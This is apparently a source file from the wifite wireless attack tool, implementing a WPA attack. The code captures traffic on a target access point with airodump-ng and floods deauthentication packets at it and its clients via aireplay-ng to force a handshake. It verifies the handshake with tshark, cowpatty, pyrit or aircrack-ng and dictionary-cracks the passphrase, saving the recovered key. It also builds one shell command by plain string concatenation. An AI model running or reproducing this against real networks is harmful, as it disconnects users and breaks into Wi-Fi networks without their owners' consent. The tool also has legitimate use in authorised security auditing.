from wifite.attack import Attack


class WPAAttack(Attack):
    def __init__(self, iface, target, clients, config):
        self.iface = iface
        self.clients = clients
        self.target = target
        self.RUN_CONFIG = config

    def run(self):
        """
            Abstract method for initializing the WPA attack
        """
        self.wpa_get_handshake()

    def end(self):
        """
            Abstract method for ending the WPA attack
        """
        pass

    def wpa_get_handshake(self):
        """
            Opens an airodump capture on the target, dumping to a file.
            During the capture, sends deauthentication packets to the target both as
            general deauthentication packets and specific packets aimed at connected clients.
            Waits until a handshake is captured.
                "iface"   - interface to capture on
                "target"  - Target object containing info on access point
                "clients" - List of Client objects associated with the target
            Returns True if handshake was found, False otherwise
        """

        if self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0: self.RUN_CONFIG.WPA_ATTACK_TIMEOUT = -1

        # Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap
        save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) \
              + '_' + self.target.bssid.replace(':', '-') + '.cap'

        # Check if we already have a handshake for this SSID... If we do, generate a new filename
        save_index = 0
        while os.path.exists(save_as):
            save_index += 1
            save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) \
                             + '_' + self.target.bssid.replace(':', '-') \
                             + '_' + str(save_index) + '.cap'

        # Remove previous airodump output files (if needed)
        remove_airodump_files(self.RUN_CONFIG.temp + 'wpa')

        # Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
        try:
            # Start airodump-ng process to capture handshakes
            cmd = ['airodump-ng',
                  '-w', self.RUN_CONFIG.temp + 'wpa',
                  '-c', self.target.channel,
                  '--bssid', self.target.bssid, self.iface]
            proc_read = Popen(cmd, stdout=DN, stderr=DN)

            # Setting deauthentication process here to avoid errors later on
            proc_deauth = None

            print ' %s starting %swpa handshake capture%s on "%s"' % \
                    (GR+sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT)+W, G, W, G+self.target.ssid+W)
            got_handshake = False

            seconds_running = 0

            target_clients = self.clients[:]
            client_index = -1
            start_time = time.time()
            # Deauth and check-for-handshake loop
            while not got_handshake and (self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0 or seconds_running < self.RUN_CONFIG.WPA_ATTACK_TIMEOUT):
                if proc_read.poll() != None:
                    print ""
                    print "airodump-ng exited with status " + str(proc_read.poll())
                    print ""
                    break
                time.sleep(1)
                seconds_running = int(time.time() - start_time)

                print "                                                          \r",
                print ' %s listening for handshake...\r' % \
                      (GR+sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W),
                stdout.flush()

                if seconds_running % self.RUN_CONFIG.WPA_DEAUTH_TIMEOUT == 0:
                    # Send deauth packets via aireplay-ng
                    cmd = ['aireplay-ng',
                          '--ignore-negative-one',
                          '-0',  # Attack method (Deauthentication)
                           str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),  # Number of packets to send
                          '-a', self.target.bssid]

                    client_index += 1

                    if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
                        print " %s sending %s deauth to %s*broadcast*%s..." % \
                                 (GR+sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, G+str(self.RUN_CONFIG.WPA_DEAUTH_COUNT)+W, G, W),
                        client_index = -1
                    else:
                        print " %s sending %s deauth to %s... " % \
                                 (GR+sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, \
                                  G+str(self.RUN_CONFIG.WPA_DEAUTH_COUNT)+W, \
                                 G+target_clients[client_index].bssid+W),
                        cmd.append('-h')
                        cmd.append(target_clients[client_index].bssid)
                    cmd.append(self.iface)
                    stdout.flush()

                    # Send deauth packets via aireplay, wait for them to complete.
                    proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
                    proc_deauth.wait()
                    print "sent\r",
                    stdout.flush()

                # Copy current dump file for consistency
                if not os.path.exists(self.RUN_CONFIG.temp + 'wpa-01.cap'): continue
                copy(self.RUN_CONFIG.temp + 'wpa-01.cap', self.RUN_CONFIG.temp + 'wpa-01.cap.temp')

                # Save copy of cap file (for debugging)
                #remove_file('/root/new/wpa-01.cap')
                #copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')

                # Check for handshake
                if self.has_handshake(self.target, self.RUN_CONFIG.temp + 'wpa-01.cap.temp'):
                    got_handshake = True

                    try: os.mkdir(self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep)
                    except OSError: pass

                    # Kill the airodump and aireplay processes
                    send_interrupt(proc_read)
                    send_interrupt(proc_deauth)

                    # Save a copy of the handshake
                    rename(self.RUN_CONFIG.temp + 'wpa-01.cap.temp', save_as)

                    print '\n %s %shandshake captured%s! saved as "%s"' % (GR+sec_to_hms(seconds_running)+W, G, W, G+save_as+W)
                    self.RUN_CONFIG.WPA_FINDINGS.append('%s (%s) handshake captured' % (self.target.ssid, self.target.bssid))
                    self.RUN_CONFIG.WPA_FINDINGS.append('saved as %s' % (save_as))
                    self.RUN_CONFIG.WPA_FINDINGS.append('')

                    # Strip handshake if needed
                    if self.RUN_CONFIG.WPA_STRIP_HANDSHAKE: self.strip_handshake(save_as)

                    # Add the filename and SSID to the list of 'to-crack'
                    # Cracking will be handled after all attacks are finished.
                    self.RUN_CONFIG.WPA_CAPS_TO_CRACK.append(CapFile(save_as, self.target.ssid, self.target.bssid))

                    break # Break out of while loop

                # No handshake yet
                os.remove(self.RUN_CONFIG.temp + 'wpa-01.cap.temp')

                # Check the airodump output file for new clients
                for client in self.RUN_CONFIG.RUN_ENGINE.parse_csv(self.RUN_CONFIG.temp + 'wpa-01.csv')[1]:
                    if client.station != self.target.bssid: continue
                    new_client = True
                    for c in target_clients:
                        if client.bssid == c.bssid:
                            new_client = False
                            break

                    if new_client:
                        print " %s %snew client%s found: %s                         " % \
                               (GR+sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W, \
                               G+client.bssid+W)
                        target_clients.append(client)

            # End of Handshake wait loop.

            if not got_handshake:
                print R+' [0:00:00]'+O+' unable to capture handshake in time'+W

        except KeyboardInterrupt:
            print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
            if attack_interrupted_prompt():
                remove_airodump_files(self.RUN_CONFIG.temp + 'wpa')
                send_interrupt(proc_read)
                send_interrupt(proc_deauth)
                print ''
                self.RUN_CONFIG.exit_gracefully(0)


        # clean up
        remove_airodump_files(self.RUN_CONFIG.temp + 'wpa')
        send_interrupt(proc_read)
        send_interrupt(proc_deauth)

        return got_handshake

    def has_handshake_tshark(self, target, capfile):
        """
            Uses TShark to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if program_exists('tshark'):
            # Call Tshark to return list of EAPOL packets in cap file.
            cmd = ['tshark',
                   '-r', capfile, # Input file
                   '-R', 'eapol', # Filter (only EAPOL packets)
                   '-n']          # Do not resolve names (MAC vendors)
            proc = Popen(cmd, stdout=PIPE, stderr=DN)
            proc.wait()
            lines = proc.communicate()[0].split('\n')

            # Get list of all clients in cap file
            clients = []
            for line in lines:
                if line.find('appears to have been cut short') != -1 or line.find('Running as user "root"') != -1 or line.strip() == '':
                    continue

                while line.startswith(' '):  line = line[1:]
                while line.find('  ') != -1: line = line.replace('  ', ' ')

                fields = line.split(' ')
                # ensure tshark dumped correct info
                if len(fields) < 5:
                    continue

                src = fields[2].lower()
                dst = fields[4].lower()

                if src == target.bssid.lower() and clients.count(dst) == 0: clients.append(dst)
                elif dst == target.bssid.lower() and clients.count(src) == 0: clients.append(src)

            # Check each client for a handshake
            for client in clients:
                msg_num = 1 # Index of message in 4-way handshake (starts at 1)

                for line in lines:
                    if line.find('appears to have been cut short') != -1: continue
                    if line.find('Running as user "root"') != -1: continue
                    if line.strip() == '': continue

                    # Sanitize tshark's output, separate into fields
                    while line[0] == ' ': line = line[1:]
                    while line.find('  ') != -1: line = line.replace('  ', ' ')

                    fields = line.split(' ')

                    # Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
                    # This catches this glitch and fixes it.
                    if len(fields) < 8:
                        continue
                    elif len(fields) == 8:
                        fields.append('(msg')
                        fields.append('3/4)')

                    src = fields[2].lower() # Source MAC address
                    dst = fields[4].lower() # Destination MAC address
                    #msg = fields[9][0]      # The message number (1, 2, 3, or 4)
                    msg = fields[-1][0]

                    # First, third msgs in 4-way handshake are from the target to client
                    if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client): continue
                    # Second, fourth msgs in 4-way handshake are from client to target
                    elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client): continue

                    # The messages must appear in sequential order.
                    try:
                        if int(msg) != msg_num: continue
                    except ValueError: continue

                    msg_num += 1

                    # We need the first 4 messages of the 4-way handshake
                    # Although aircrack-ng cracks just fine with only 3 of the messages...
                    if msg_num >= 4:
                        return True
        return False

    def has_handshake_cowpatty(self, target, capfile, nonstrict=True):
        """
            Uses cowpatty to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if not program_exists('cowpatty'): return False

        # Call cowpatty to check if capfile contains a valid handshake.
        cmd = ['cowpatty',
               '-r', capfile,     # input file
               '-s', target.ssid, # SSID
               '-c']              # Check for handshake
        # Uses frames 1, 2, or 3 for key attack
        if nonstrict: cmd.append('-2')
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        response = proc.communicate()[0]
        if response.find('incomplete four-way handshake exchange') != -1:
            return False
        elif response.find('Unsupported or unrecognized pcap file.') != -1:
            return False
        elif response.find('Unable to open capture file: Success') != -1:
            return False
        return True

    def has_handshake_pyrit(self, target, capfile):
        """
            Uses pyrit to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if not program_exists('pyrit'): return False

        # Call pyrit to "Analyze" the cap file's handshakes.
        cmd = ['pyrit',
               '-r', capfile,
               'analyze']
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        hit_essid = False
        for line in proc.communicate()[0].split('\n'):
            # Iterate over every line of output by Pyrit
            if line == '' or line == None: continue
            if line.find("AccessPoint") != -1:
                hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
                            (line.lower().find(target.bssid.lower()) != -1)
                #hit_essid = (line.lower().find(target.bssid.lower()))

            else:
                # If Pyrit says it's good or workable, it's a valid handshake.
                if hit_essid and (line.find(', good, ') != -1 or \
                                  line.find(', workable, ') != -1):
                    return True
        return False

    def has_handshake_aircrack(self, target, capfile):
        """
            Uses aircrack-ng to check for handshake.
            Returns True if found, False otherwise.
        """
        if not program_exists('aircrack-ng'): return False
        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
        proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
        proc_crack.wait()
        txt = proc_crack.communicate()[0]

        return (txt.find('Passphrase not in dictionary') != -1)

    def has_handshake(self, target, capfile):
        """
            Checks if .cap file contains a handshake.
            Returns True if handshake is found, False otherwise.
        """
        valid_handshake = True
        tried = False
        if self.RUN_CONFIG.WPA_HANDSHAKE_TSHARK:
            tried = True
            valid_handshake = self.has_handshake_tshark(target, capfile)

        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
            tried = True
            valid_handshake = self.has_handshake_cowpatty(target, capfile)

        # Use CowPatty to check for handshake.
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
            tried = True
            valid_handshake = self.has_handshake_cowpatty(target, capfile)

        # Check for handshake using Pyrit if applicable
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_PYRIT:
            tried = True
            valid_handshake = self.has_handshake_pyrit(target, capfile)

        # Check for handshake using aircrack-ng
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_AIRCRACK:
            tried = True
            valid_handshake = self.has_handshake_aircrack(target, capfile)

        if tried: return valid_handshake
        print R+' [!]'+O+' unable to check for handshake: all handshake options are disabled!'
        self.RUN_CONFIG.exit_gracefully(1)

    def strip_handshake(self, capfile):
        """
            Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
            File in location 'capfile' is overwritten!
        """
        output_file = capfile
        if program_exists('pyrit'):
            cmd = ['pyrit',
                 '-r', capfile,
                 '-o', output_file,
                 'strip']
            call(cmd,stdout=DN, stderr=DN)

        elif program_exists('tshark'):
            # strip results with tshark
            cmd = ['tshark',
                   '-r', capfile,      # input file
                   '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
                   '-w', capfile + '.temp'] # output file
            proc_strip = call(cmd, stdout=DN, stderr=DN)

            rename(capfile + '.temp', output_file)

        else:
            print R+" [!]"+O+" unable to strip .cap file: neither pyrit nor tshark were found"+W

##########################
# WPA CRACKING FUNCTIONS #
##########################
def wpa_crack(capfile, RUN_CONFIG):
    """
        Cracks cap file using aircrack-ng
        This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
        they can do so manually.
    """
    if RUN_CONFIG.WPA_DICTIONARY == '':
        print R+' [!]'+O+' no WPA dictionary found! use -dict <file> command-line argument'+W
        return False

    print GR+' [0:00:00]'+W+' cracking %s with %s' % (G+capfile.ssid+W, G+'aircrack-ng'+W)
    start_time = time.time()
    cracked = False

    remove_file(RUN_CONFIG.temp + 'out.out')
    remove_file(RUN_CONFIG.temp + 'wpakey.txt')

    cmd = ['aircrack-ng',
           '-a', '2',                 # WPA crack
           '-w', RUN_CONFIG.WPA_DICTIONARY,      # Wordlist
           '-l', RUN_CONFIG.temp + 'wpakey.txt', # Save key to file
           '-b', capfile.bssid,       # BSSID of target
           capfile.filename]

    proc = Popen(cmd, stdout=open(RUN_CONFIG.temp + 'out.out', 'a'), stderr=DN)
    try:
        kt  = 0 # Keys tested
        kps = 0 # Keys per second
        while True:
            time.sleep(1)

            if proc.poll() != None: # aircrack stopped
                if os.path.exists(RUN_CONFIG.temp + 'wpakey.txt'):
                    # Cracked
                    inf = open(RUN_CONFIG.temp + 'wpakey.txt')
                    key = inf.read().strip()
                    inf.close()
                    RUN_CONFIG.WPA_FINDINGS.append('cracked wpa key for "%s" (%s): "%s"' % (G+capfile.ssid+W, G+capfile.bssid+W, C+key+W))
                    RUN_CONFIG.WPA_FINDINGS.append('')
                    t = Target(capfile.bssid, 0, 0, 0, 'WPA', capfile.ssid)
                    t.key = key
                    RUN_CONFIG.save_cracked(t)

                    print GR+'\n [+]'+W+' cracked %s (%s)!' % (G+capfile.ssid+W, G+capfile.bssid+W)
                    print GR+' [+]'+W+' key:    "%s"\n' % (C+key+W)
                    cracked = True
                else:
                    # Did not crack
                    print R+'\n [!]'+R+'crack attempt failed'+O+': passphrase not in dictionary'+W
                break

            inf = open(RUN_CONFIG.temp + 'out.out', 'r')
            lines = inf.read().split('\n')
            inf.close()
            outf = open(RUN_CONFIG.temp + 'out.out', 'w')
            outf.close()
            for line in lines:
                i = line.find(']')
                j = line.find('keys tested', i)
                if i != -1 and j != -1:
                    kts = line[i+2:j-1]
                    try: kt = int(kts)
                    except ValueError: pass
                i = line.find('(')
                j = line.find('k/s)', i)
                if i != -1 and j != -1:
                    kpss = line[i+1:j-1]
                    try: kps = float(kpss)
                    except ValueError: pass

            print "\r %s %s keys tested (%s%.2f keys/sec%s)   " % \
                   (GR+sec_to_hms(time.time() - start_time)+W, G+add_commas(kt)+W, G, kps, W),
            stdout.flush()

    except KeyboardInterrupt: print R+'\n (^C)'+O+' WPA cracking interrupted'+W

    send_interrupt(proc)
    try: os.kill(proc.pid, SIGTERM)
    except OSError: pass

    return cracked

def add_commas(n):
    """
        Receives integer n, returns string representation of n with commas in thousands place.
        I'm sure there's easier ways of doing this... but meh.
    """
    strn = str(n)
    lenn = len(strn)
    i = 0
    result = ''
    while i < lenn:
        if (lenn - i) % 3 == 0 and i != 0: result += ','
        result += strn[i]
        i += 1
    return result
